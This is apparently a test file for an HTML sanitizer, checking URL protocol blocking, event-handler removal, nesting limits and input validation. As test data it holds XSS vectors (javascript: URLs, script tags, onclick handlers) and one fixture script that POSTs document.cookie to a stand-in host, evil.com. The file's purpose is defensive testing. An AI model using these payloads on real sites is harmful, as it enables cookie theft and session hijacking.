/**
 * Security tests for HTML sanitizer
 */

import { describe, it, expect } from 'bun:test';
import { validateInput, sanitizeUrl, checkNestingDepth, sanitizeAttributes, createSafeParser } from './sanitizer.js';
import { SecurityError } from '@/errors/converter-errors.js';

// Setup DOM globals
import '@/test/dom-setup.ts';

describe('Security functions', () => {
  describe('validateInput', () => {
    it('accepts valid HTML', () => {
      const validHTML = '<p>This is valid HTML</p>';
      expect(() => validateInput(validHTML)).not.toThrow();
    });

    it('rejects null bytes', () => {
      const htmlWithNullByte = '<p>Text with \0 null byte</p>';
      expect(() => validateInput(htmlWithNullByte)).toThrow(SecurityError);
    });

    it('accepts HTML within size limits', () => {
      const html = '<p>' + 'a'.repeat(1000) + '</p>';
      expect(() => validateInput(html)).not.toThrow();
    });

    it('tracks script tags (but doesn\'t reject)', () => {
      const htmlWithScript = '<p>Text</p><script>alert("test")</script>';
      // Should not throw - DOMParser handles it safely
      expect(() => validateInput(htmlWithScript)).not.toThrow();
    });

    it('rejects input exceeding size limit', () => {
      // Create HTML larger than 10MB
      const largeHTML = '<p>' + 'a'.repeat(11 * 1024 * 1024) + '</p>';
      expect(() => validateInput(largeHTML)).toThrow(SecurityError);
      expect(() => validateInput(largeHTML)).toThrow('Input too large');
    });

    it('handles empty input', () => {
      expect(() => validateInput('')).not.toThrow();
    });

    it('handles whitespace-only input', () => {
      expect(() => validateInput('   \n\t   ')).not.toThrow();
    });

    it('handles input at size boundary', () => {
      // Test exactly at 10MB limit
      const boundaryHTML = 'a'.repeat(10 * 1024 * 1024);
      expect(() => validateInput(boundaryHTML)).not.toThrow();
    });

    it('detects various script tag patterns', () => {
      const scriptVariants = [
        '<SCRIPT>alert(1)</SCRIPT>',
        '<script >alert(1)</script>',
        '<script\n>alert(1)</script>',
        '<script\t>alert(1)</script>',
        '<scriptsrc="test.js"></script>'
      ];

      for (const script of scriptVariants) {
        // Should not throw but will track the script pattern
        expect(() => validateInput(script)).not.toThrow();
      }
    });

    it('handles null byte in different positions', () => {
      expect(() => validateInput('\0')).toThrow(SecurityError);
      expect(() => validateInput('start\0end')).toThrow(SecurityError);
      expect(() => validateInput('content\0')).toThrow(SecurityError);
    });

    it('validates unicode and special characters', () => {
      const unicodeHTML = '<p>Unicode: 你好 🎉 émojis</p>';
      expect(() => validateInput(unicodeHTML)).not.toThrow();
    });
  });

  describe('sanitizeUrl', () => {
    it('allows safe URLs', () => {
      expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
      expect(sanitizeUrl('http://example.com')).toBe('http://example.com');
      expect(sanitizeUrl('/relative/path')).toBe('/relative/path');
      expect(sanitizeUrl('mailto:test@example.com')).toBe('mailto:test@example.com');
    });

    it('blocks dangerous protocols', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBe('');
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
      expect(sanitizeUrl('vbscript:msgbox(1)')).toBe('');
      expect(sanitizeUrl('file:///etc/passwd')).toBe('');
    });

    it('handles protocol-relative URLs', () => {
      expect(sanitizeUrl('//example.com/path')).toBe('https://example.com/path');
    });

    it('handles malformed URLs gracefully', () => {
      expect(sanitizeUrl('ht!tp://bad url')).toBe('ht!tp://bad%20url');
    });

    it('handles empty and whitespace URLs', () => {
      expect(sanitizeUrl('')).toBe('');
      expect(sanitizeUrl('   ')).toBe('');
    });

    it('blocks all dangerous protocols', () => {
      const dangerousUrls = [
        'javascript:alert(1)',
        'JAVASCRIPT:alert(1)', // Case insensitive
        'data:text/html,<script>alert(1)</script>',
        'DATA:application/json,{}',
        'vbscript:msgbox(1)',
        'VBSCRIPT:Execute("test")',
        'file:///etc/passwd',
        'FILE:///C:/Windows/System32',
        'about:blank',
        'ABOUT:config',
        'chrome://settings',
        'chrome-extension://abc123/popup.html'
      ];

      for (const url of dangerousUrls) {
        expect(sanitizeUrl(url)).toBe('');
      }
    });

    it('handles various safe URL formats', () => {
      const safeUrls = [
        'https://example.com',
        'http://example.com',
        'https://sub.example.com/path?query=value#fragment',
        '/relative/path',
        './relative/path', 
        '../relative/path',
        'mailto:user@example.com',
        'tel:+1234567890',
        'ftp://ftp.example.com/file.txt',
        'news:comp.infosystems.www.servers.unix',
        'irc://irc.example.com/channel'
      ];

      for (const url of safeUrls) {
        expect(sanitizeUrl(url)).toBe(url);
      }
    });

    it('converts protocol-relative URLs to HTTPS', () => {
      expect(sanitizeUrl('//example.com')).toBe('https://example.com');
      expect(sanitizeUrl('//cdn.example.com/script.js')).toBe('https://cdn.example.com/script.js');
    });

    it('encodes whitespace in URLs', () => {
      expect(sanitizeUrl('https://example.com/path with spaces')).toBe('https://example.com/path%20with%20spaces');
      expect(sanitizeUrl('path with\tspaces\nand\nnewlines')).toBe('path%20with%20spaces%20and%20newlines');
    });

    it('handles malformed URLs gracefully', () => {
      expect(sanitizeUrl('http://')).toBe('http://');
      expect(sanitizeUrl('https://')).toBe('https://');
      expect(sanitizeUrl('not a url')).toBe('not%20a%20url');
      expect(sanitizeUrl('ht!tp://example.com')).toBe('ht!tp://example.com');
    });

    it('handles URLs with special characters', () => {
      expect(sanitizeUrl('https://example.com/päth')).toBe('https://example.com/päth');
      expect(sanitizeUrl('https://example.com/path?q=tést')).toBe('https://example.com/path?q=tést');
    });

    it('handles null and undefined input', () => {
      expect(sanitizeUrl(null as any)).toBe('');
      expect(sanitizeUrl(undefined as any)).toBe('');
    });

    it('preserves valid URL structures', () => {
      const complexUrl = 'https://user:pass@example.com:8080/path/to/resource?param1=value1&param2=value2#section';
      expect(sanitizeUrl(complexUrl)).toBe(complexUrl);
    });

    it('handles edge cases with dangerous protocol variations', () => {
      expect(sanitizeUrl('javascript\t:alert(1)')).toBe('javascript%20:alert(1)'); // Tab converted to space then encoded
      expect(sanitizeUrl('java\nscript:alert(1)')).toBe('java%20script:alert(1)'); // Newline converted
      expect(sanitizeUrl('java script:alert(1)')).toBe('java%20script:alert(1)'); // Space encoded
    });

    it('handles very long URLs', () => {
      const longPath = 'a'.repeat(2000);
      const longUrl = `https://example.com/${longPath}`;
      expect(sanitizeUrl(longUrl)).toBe(longUrl);
    });
  });

  describe('checkNestingDepth', () => {
    it('allows normal nesting', () => {
      const doc = new DOMParser().parseFromString(`
        <div>
          <div>
            <div>
              <p>Normal nesting</p>
            </div>
          </div>
        </div>
      `, 'text/html');
      
      expect(() => checkNestingDepth(doc.body as any)).not.toThrow();
    });

    it('throws on excessive nesting', () => {
      let html = '<div>';
      for (let i = 0; i < 505; i++) {
        html += '<div>';
      }
      html += 'Deep content';
      for (let i = 0; i < 505; i++) {
        html += '</div>';
      }
      html += '</div>';

      const doc = new DOMParser().parseFromString(html, 'text/html');

      expect(() => checkNestingDepth(doc.body as any)).toThrow(SecurityError);
    });

    it('handles nesting exactly at the limit', () => {
      // Create exactly 500 levels of nesting
      let html = '';
      for (let i = 0; i < 500; i++) {
        html += '<div>';
      }
      html += 'content';
      for (let i = 0; i < 500; i++) {
        html += '</div>';
      }

      const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
      expect(() => checkNestingDepth(doc.body as any)).not.toThrow();
    });

    it('throws at exactly 501 levels', () => {
      // Create exactly 501 levels of nesting (should fail)
      let html = '';
      for (let i = 0; i < 501; i++) {
        html += '<div>';
      }
      html += 'content';
      for (let i = 0; i < 501; i++) {
        html += '</div>';
      }

      const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
      expect(() => checkNestingDepth(doc.body as any)).toThrow(SecurityError);
      expect(() => checkNestingDepth(doc.body as any)).toThrow('HTML nesting depth exceeds maximum of 500');
    });

    it('handles elements with no children', () => {
      const doc = new DOMParser().parseFromString('<p>Just text</p>', 'text/html');
      expect(() => checkNestingDepth(doc.body as any)).not.toThrow();
    });

    it('handles mixed element types in nesting', () => {
      const html = `
        <article>
          <header>
            <h1>
              <span>
                <strong>
                  <em>Deep nesting</em>
                </strong>
              </span>
            </h1>
          </header>
        </article>
      `;
      const doc = new DOMParser().parseFromString(html, 'text/html');
      expect(() => checkNestingDepth(doc.body as any)).not.toThrow();
    });

    it('handles multiple branches at different depths', () => {
      const html = `
        <div>
          <div><div><div>Branch 1</div></div></div>
          <div>Branch 2</div>
          <div><div>Branch 3</div></div>
        </div>
      `;
      const doc = new DOMParser().parseFromString(html, 'text/html');
      expect(() => checkNestingDepth(doc.body as any)).not.toThrow();
    });

    it('provides correct depth tracking in error message', () => {
      // Create nesting that exceeds limit
      let html = '';
      for (let i = 0; i < 505; i++) {
        html += '<div>';
      }
      html += 'content';
      for (let i = 0; i < 505; i++) {
        html += '</div>';
      }

      const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');

      try {
        checkNestingDepth(doc.body as any);
        expect(false).toBe(true); // Should not reach here
      } catch (error) {
        expect(error).toBeInstanceOf(SecurityError);
        expect((error as any).message).toContain('500');
        expect((error as any).code).toBe('SECURITY_VIOLATION');
        expect((error as any).threatType).toBe('EXCESSIVE_NESTING');
      }
    });

    it('handles custom starting depth', () => {
      const doc = new DOMParser().parseFromString('<div><span>Test</span></div>', 'text/html');
      const element = doc.querySelector('div')!;

      // Start at depth 499, should allow 1 more level
      expect(() => checkNestingDepth(element as any, 499)).not.toThrow();

      // Start at depth 500, should fail immediately on first child
      expect(() => checkNestingDepth(element as any, 500)).toThrow(SecurityError);
    });
  });

  describe('sanitizeAttributes', () => {
    it('removes event handlers', () => {
      // Test with a mock element to avoid Happy DOM issues
      const removedAttributes: string[] = [];
      const mockElement = {
        attributes: [
          { name: 'onclick', value: 'alert(1)' },
          { name: 'onmouseover', value: 'alert(2)' },
          { name: 'class', value: 'button' },
        ],
        setAttribute: () => {},
        removeAttribute: (name: string) => {
          removedAttributes.push(name);
        },
      };
      
      // Call sanitizeAttributes with our mock
      sanitizeAttributes(mockElement as any);
      
      // Check that event handlers were removed
      expect(removedAttributes).toContain('onclick');
      expect(removedAttributes).toContain('onmouseover');
      expect(removedAttributes).not.toContain('class');
    });

    it('sanitizes href attributes', () => {
      const doc = new DOMParser().parseFromString(
        '<a href="javascript:alert(1)">Link</a>',
        'text/html'
      );
      
      const link = doc.querySelector('a')!;
      sanitizeAttributes(link as any);
      
      expect(link.getAttribute('href')).toBe('');
    });

    it('sanitizes src attributes', () => {
      const doc = new DOMParser().parseFromString(
        '<img src="javascript:alert(1)" alt="test">',
        'text/html'
      );
      
      const img = doc.querySelector('img')!;
      sanitizeAttributes(img as any);
      
      expect(img.getAttribute('src')).toBe('');
    });

    it('preserves safe attributes', () => {
      const doc = new DOMParser().parseFromString(
        '<a href="https://example.com" class="link" id="test">Link</a>',
        'text/html'
      );
      
      const link = doc.querySelector('a')!;
      sanitizeAttributes(link as any);
      
      expect(link.getAttribute('href')).toBe('https://example.com');
      expect(link.getAttribute('class')).toBe('link');
      expect(link.getAttribute('id')).toBe('test');
    });

    it('removes all types of event handlers', () => {
      // Use mock elements to avoid Happy DOM issues with complex event handlers
      const eventHandlers = [
        'onclick', 'onmouseover', 'onmouseout', 'onmousedown', 'onmouseup',
        'onkeydown', 'onkeyup', 'onkeypress', 'onload', 'onerror',
        'onfocus', 'onblur', 'onchange', 'onsubmit', 'onreset'
      ];

      for (const handler of eventHandlers) {
        const removedAttributes: string[] = [];
        const mockElement = {
          attributes: [
            { name: handler, value: 'alert(1)' },
            { name: 'class', value: 'safe' },
          ],
          setAttribute: () => {},
          removeAttribute: (name: string) => {
            removedAttributes.push(name);
          },
        };
        
        sanitizeAttributes(mockElement as any);
        
        expect(removedAttributes).toContain(handler);
        expect(removedAttributes).not.toContain('class');
      }
    });

    it('handles case-insensitive event handlers', () => {
      const removedAttributes: string[] = [];
      const mockElement = {
        attributes: [
          { name: 'ONCLICK', value: 'alert(1)' },
          { name: 'OnMouseOver', value: 'alert(2)' },
          { name: 'class', value: 'safe' },
        ],
        setAttribute: () => {},
        removeAttribute: (name: string) => {
          removedAttributes.push(name);
        },
      };
      
      sanitizeAttributes(mockElement as any);
      
      expect(removedAttributes).toContain('ONCLICK');
      expect(removedAttributes).toContain('OnMouseOver');
      expect(removedAttributes).not.toContain('class');
    });

    it('sanitizes multiple URL attributes simultaneously', () => {
      const html = '<a href="javascript:alert(1)" data-url="https://safe.com">Link</a>';
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const element = doc.querySelector('a')!;
      
      sanitizeAttributes(element as any);
      
      expect(element.getAttribute('href')).toBe('');
      expect(element.getAttribute('data-url')).toBe('https://safe.com'); // Non-href/src preserved
    });

    it('handles elements with no attributes', () => {
      const doc = new DOMParser().parseFromString('<div>Content</div>', 'text/html');
      const element = doc.querySelector('div')!;
      
      expect(() => sanitizeAttributes(element as any)).not.toThrow();
    });

    it('handles malformed attribute values', () => {
      // Create element with problematic attributes manually to test edge cases
      const removedAttributes: string[] = [];
      const mockElement = {
        attributes: [
          { name: 'onclick', value: null },
          { name: 'href', value: 'javascript:' },
          { name: 'src', value: undefined },
          { name: 'onerror', value: '' }
        ],
        setAttribute: () => {},
        removeAttribute: (name: string) => {
          removedAttributes.push(name);
        }
      };
      
      sanitizeAttributes(mockElement as any);
      
      expect(removedAttributes).toContain('onclick');
      expect(removedAttributes).toContain('onerror');
    });

    it('handles removeAttribute errors gracefully', () => {
      const mockElement = {
        attributes: [
          { name: 'onclick', value: 'alert(1)' }
        ],
        setAttribute: () => {},
        removeAttribute: () => {
          throw new Error('Removal failed');
        }
      };
      
      // Should not throw even if removeAttribute fails
      expect(() => sanitizeAttributes(mockElement as any)).not.toThrow();
    });

    it('preserves data attributes and other safe attributes', () => {
      const removedAttributes: string[] = [];
      const setAttributes: { [key: string]: string } = {};
      const mockElement = {
        attributes: [
          { name: 'id', value: 'test' },
          { name: 'class', value: 'button' },
          { name: 'data-value', value: '123' },
          { name: 'aria-label', value: 'Button' },
          { name: 'title', value: 'Tooltip' },
          { name: 'onclick', value: 'alert(1)' },
        ],
        setAttribute: (name: string, value: string) => {
          setAttributes[name] = value;
        },
        removeAttribute: (name: string) => {
          removedAttributes.push(name);
        },
      };
      
      sanitizeAttributes(mockElement as any);
      
      // Event handler should be removed
      expect(removedAttributes).toContain('onclick');
      
      // Safe attributes should not be removed
      expect(removedAttributes).not.toContain('id');
      expect(removedAttributes).not.toContain('class');
      expect(removedAttributes).not.toContain('data-value');
      expect(removedAttributes).not.toContain('aria-label');
      expect(removedAttributes).not.toContain('title');
    });

    it('handles src attribute sanitization correctly', () => {
      const testCases = [
        { input: 'javascript:alert(1)', expected: '' },
        { input: 'data:text/html,<script></script>', expected: '' },
        { input: 'https://example.com/image.jpg', expected: 'https://example.com/image.jpg' },
        { input: '/relative/image.png', expected: '/relative/image.png' }
      ];

      for (const testCase of testCases) {
        const html = `<img src="${testCase.input}" alt="test">`;
        const doc = new DOMParser().parseFromString(html, 'text/html');
        const element = doc.querySelector('img')!;
        
        sanitizeAttributes(element as any);
        
        expect(element.getAttribute('src')).toBe(testCase.expected);
      }
    });

    it('handles href attribute sanitization correctly', () => {
      const testCases = [
        { input: 'javascript:void(0)', expected: '' },
        { input: 'data:application/json,{}', expected: '' },
        { input: 'https://example.com', expected: 'https://example.com' },
        { input: 'mailto:test@example.com', expected: 'mailto:test@example.com' },
        { input: '#anchor', expected: '#anchor' }
      ];

      for (const testCase of testCases) {
        const html = `<a href="${testCase.input}">Link</a>`;
        const doc = new DOMParser().parseFromString(html, 'text/html');
        const element = doc.querySelector('a')!;
        
        sanitizeAttributes(element as any);
        
        expect(element.getAttribute('href')).toBe(testCase.expected);
      }
    });

    it('handles complex attribute combinations', () => {
      const removedAttributes: string[] = [];
      const setAttributes: { [key: string]: string } = {};
      const mockElement = {
        attributes: [
          { name: 'href', value: 'javascript:alert(1)' },
          { name: 'onclick', value: 'malicious()' },
          { name: 'onmouseover', value: 'bad()' },
          { name: 'class', value: 'link' },
          { name: 'id', value: 'test-link' },
          { name: 'data-tracking', value: '12345' },
        ],
        setAttribute: (name: string, value: string) => {
          setAttributes[name] = value;
        },
        removeAttribute: (name: string) => {
          removedAttributes.push(name);
        },
      };
      
      sanitizeAttributes(mockElement as any);
      
      // Dangerous attributes should be removed or sanitized
      expect(removedAttributes).toContain('onclick');
      expect(removedAttributes).toContain('onmouseover');
      expect(setAttributes['href']).toBe(''); // href should be sanitized to empty
      
      // Safe attributes should not be removed
      expect(removedAttributes).not.toContain('class');
      expect(removedAttributes).not.toContain('id');
      expect(removedAttributes).not.toContain('data-tracking');
    });
  });

  describe('createSafeParser', () => {
    it('creates a DOMParser instance when available', () => {
      const parser = createSafeParser();
      expect(parser).toBeDefined();
      expect(typeof parser.parseFromString).toBe('function');
    });

    it('can parse HTML with created parser', () => {
      const parser = createSafeParser();
      const doc = parser.parseFromString('<p>Test</p>', 'text/html');
      expect(doc).toBeDefined();
      expect(doc.body).toBeDefined();
    });

    it('throws error when DOMParser is not available', () => {
      // Temporarily hide DOMParser
      const originalDOMParser = globalThis.DOMParser;
      delete (globalThis as any).DOMParser;
      
      expect(() => createSafeParser()).toThrow('No DOMParser found');
      
      // Restore DOMParser
      globalThis.DOMParser = originalDOMParser;
    });

    it('returns parser that works with sanitization functions', () => {
      const parser = createSafeParser();
      const html = '<a href="javascript:alert(1)">Link</a>';
      const doc = parser.parseFromString(html, 'text/html');
      
      const link = doc.querySelector('a')!;
      sanitizeAttributes(link as any);
      
      expect(link.getAttribute('href')).toBe('');
    });
  });

  describe('XSS attack vectors', () => {
    it('handles common XSS vectors safely', () => {
      // Test a subset of vectors that don't cause Happy DOM issues
      const safeVectors = [
        '<img src=x>',
        '<script>alert(1)</script>',
        '<style>@import "test"</style>',
        '<form action="test">',
        '<textarea>&lt;script&gt;alert(1)&lt;/script&gt;</textarea>',
      ];
      
      for (const vector of safeVectors) {
        // Should not throw - we're testing that these are handled safely
        expect(() => {
          const doc = new DOMParser().parseFromString(vector, 'text/html');
          checkNestingDepth(doc.body as any);
          
          // Sanitize all elements
          const elements = doc.querySelectorAll('*');
          for (const element of elements) {
            sanitizeAttributes(element as any);
          }
        }).not.toThrow();
      }
    });

    it('sanitizes advanced XSS vectors', () => {
      const xssVectors = [
        {
          html: '<img src="x">',
          test: (doc: Document) => {
            const img = doc.querySelector('img')!;
            sanitizeAttributes(img as any);
            expect(img.getAttribute('src')).toBe('x');
          }
        },
        {
          html: '<a href="javascript:alert(document.cookie)">Click</a>',
          test: (doc: Document) => {
            const link = doc.querySelector('a')!;
            sanitizeAttributes(link as any);
            expect(link.getAttribute('href')).toBe('');
          }
        },
        {
          html: '<iframe src="javascript:alert(1)"></iframe>',
          test: (doc: Document) => {
            const iframe = doc.querySelector('iframe')!;
            sanitizeAttributes(iframe as any);
            expect(iframe.getAttribute('src')).toBe('');
          }
        },
        {
          html: '<object data="javascript:alert(1)"></object>',
          test: (doc: Document) => {
            const obj = doc.querySelector('object')!;
            sanitizeAttributes(obj as any);
            // data attribute should be handled like src/href if we extend the sanitizer
          }
        },
        {
          html: '<form action="javascript:alert(1)"><input type="submit"></form>',
          test: (doc: Document) => {
            const form = doc.querySelector('form')!;
            sanitizeAttributes(form as any);
            // action is not currently sanitized, but form elements are generally converted to text
          }
        }
      ];

      for (const vector of xssVectors) {
        const doc = new DOMParser().parseFromString(vector.html, 'text/html');
        expect(() => vector.test(doc)).not.toThrow();
      }
    });

    it('handles complex nested XSS attempts', () => {
      const complexXSS = `
        <div>
          <span>
            <a href="javascript:malicious()">
              <img src="javascript:bad()">
            </a>
          </span>
        </div>
      `;
      
      const doc = new DOMParser().parseFromString(complexXSS, 'text/html');
      
      // Sanitize all elements
      const elements = doc.querySelectorAll('*');
      for (const element of elements) {
        sanitizeAttributes(element as any);
      }
      
      // Verify all dangerous attributes removed
      expect(doc.querySelector('a')!.getAttribute('href')).toBe('');
      expect(doc.querySelector('img')!.getAttribute('src')).toBe('');
    });

    it('preserves safe content while removing XSS', () => {
      // Test simpler content to avoid Happy DOM issues
      const simpleContent = `
        <div class="container" id="main">
          <p>Safe content</p>
          <a href="https://safe.com">Safe link</a>
        </div>
      `;
      
      const doc = new DOMParser().parseFromString(simpleContent, 'text/html');
      
      // Sanitize all elements
      const elements = doc.querySelectorAll('*');
      for (const element of elements) {
        sanitizeAttributes(element as any);
      }
      
      // Safe attributes should be preserved
      expect(doc.querySelector('div')!.getAttribute('class')).toBe('container');
      expect(doc.querySelector('div')!.getAttribute('id')).toBe('main');
      expect(doc.querySelector('a')!.getAttribute('href')).toBe('https://safe.com');
    });

    it('handles protocol variations and encoding attempts', () => {
      const encodingAttempts = [
        { input: 'JAVASCRIPT:alert(1)', shouldBeEmpty: true },
        { input: 'javascript:alert(1)', shouldBeEmpty: true },
        { input: 'Java\tScript:alert(1)', shouldBeEmpty: false }, // Becomes safe with encoding
        { input: 'Java\nScript:alert(1)', shouldBeEmpty: false }, // Becomes safe with encoding
        { input: 'Java Script:alert(1)', shouldBeEmpty: false }, // Becomes safe with encoding
        { input: '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)', shouldBeEmpty: false }, // HTML entities not decoded
      ];
      
      for (const attempt of encodingAttempts) {
        const result = sanitizeUrl(attempt.input);
        if (attempt.shouldBeEmpty) {
          expect(result).toBe('');
        } else {
          // Should be safe (either empty or with encoded spaces)
          expect(result === '' || result.includes('%20') || !result.toLowerCase().startsWith('javascript:')).toBe(true);
        }
      }
    });

    it('validates comprehensive security measures', () => {
      const maliciousHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999">
          <script>
            fetch('http://evil.com/steal', {
              method: 'POST',
              body: document.cookie
            });
          </script>
          <iframe src="javascript:alert('XSS')" style="display:none"></iframe>
          <img src="x">
          <a href="javascript:void(0)">Clear Storage</a>
        </div>
      `;
      
      // Should not throw during parsing and validation
      expect(() => {
        validateInput(maliciousHTML);
        const doc = new DOMParser().parseFromString(maliciousHTML, 'text/html');
        checkNestingDepth(doc.body as any);
        
        const elements = doc.querySelectorAll('*');
        for (const element of elements) {
          sanitizeAttributes(element as any);
        }
      }).not.toThrow();
    });
  });

  describe('Integration Tests', () => {
    it('combines all security measures correctly', () => {
      const dangerousHTML = `
        <div>
          ${'<div>'.repeat(50)}
            <a href="javascript:alert(1)">
              <img src="data:text/html,<script>alert(1)</script>">
            </a>
          ${'</div>'.repeat(50)}
        </div>
      `;
      
      // Full security pipeline
      validateInput(dangerousHTML);
      const doc = new DOMParser().parseFromString(dangerousHTML, 'text/html');
      checkNestingDepth(doc.body as any);
      
      const elements = doc.querySelectorAll('*');
      for (const element of elements) {
        sanitizeAttributes(element as any);
      }
      
      // Verify sanitization worked
      const link = doc.querySelector('a')!;
      const img = doc.querySelector('img')!;
      
      expect(link.getAttribute('href')).toBe('');
      expect(img.getAttribute('src')).toBe('');
    });

    it('handles edge cases in combined security functions', () => {
      const edgeCases = [
        '', // Empty
        '   ', // Whitespace only
        '<>', // Invalid tags
        '<div></div>', // Simple valid
        '\0<script>alert(1)</script>', // Null byte with script
      ];
      
      for (const html of edgeCases) {
        if (html.includes('\0')) {
          // Should throw for null bytes
          expect(() => validateInput(html)).toThrow(SecurityError);
        } else {
          // Should handle gracefully
          expect(() => {
            validateInput(html);
            const doc = new DOMParser().parseFromString(html, 'text/html');
            checkNestingDepth(doc.body as any);
            
            const elements = doc.querySelectorAll('*');
            for (const element of elements) {
              sanitizeAttributes(element as any);
            }
          }).not.toThrow();
        }
      }
    });
  });
});